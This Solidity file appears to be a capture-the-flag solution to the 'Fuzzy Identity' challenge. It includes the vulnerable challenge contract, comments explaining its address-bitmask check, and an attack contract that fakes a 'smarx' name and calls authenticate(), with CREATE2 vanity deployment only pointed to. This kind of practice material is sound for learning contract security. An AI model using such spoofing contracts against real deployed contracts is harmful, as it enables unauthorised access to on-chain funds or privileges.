pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        // @note we need to call this from a smart contract that implements the IName interface
        return IName(addr).name() == bytes32("smarx");
    }

    function testAddress(address _addr) external pure returns (bytes20) {
        return bytes20(_addr);
    }

    function testShifting() external pure returns (bytes20) {
        bytes20 id = hex"000000000000000000000000000000000badc0de";

        for (uint256 i = 0; i < 34; i++) {
            id <<= 4;
        }

        return id;
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        // simply the address
        bytes20 addr = bytes20(_addr);

        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            // addr & mask should equal id
            // how do we do this?

            // addr ... 1011 1010 1101 1100 0000 1101 1110 .... -> this is basically the same as id sequence
            // mask ... 1111 1111 1111 1111 1111 1111 1111 ....
            // id   ... 1011 1010 1101 1100 0000 1101 1110

            // so the _addr should have the badc0de sequence
            // for this, we need to figure out a way to deploy the caller smart contract, having this sequence
            // https://chainstack.com/deploying-a-deterministic-contract-on-ethereum/#:~:text=Classically%2C%20the%20address%20of%20a,and%20hashed%20with%20Keccak%2D256.
            // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2

            if (addr & mask == id) {
                return true;
            }

            // @note the shifting operations moves each hex value "left" with 1 byte
            // if mask is 000000000000000000000000000000000fffffff
            // mask <<= 4 returns
            // 00000000000000000000000000000000fffffff0

            // mask = mask << 4
            // id = id  * 2^4
            mask <<= 4;
            // id = id << 4
            // id = id  * 2^4
            id <<= 4;
        }

        return false;
    }
}

contract FuzzyIdentityAttack is IName {
    FuzzyIdentityChallenge challenge;

    function FuzzyIdentityAttack(address _addr) public {
        challenge = FuzzyIdentityChallenge(_addr);
    }

    function name() external view returns (bytes32) {
        return bytes32("smarx");
    }

    function attack() public {
        challenge.authenticate();
    }
}
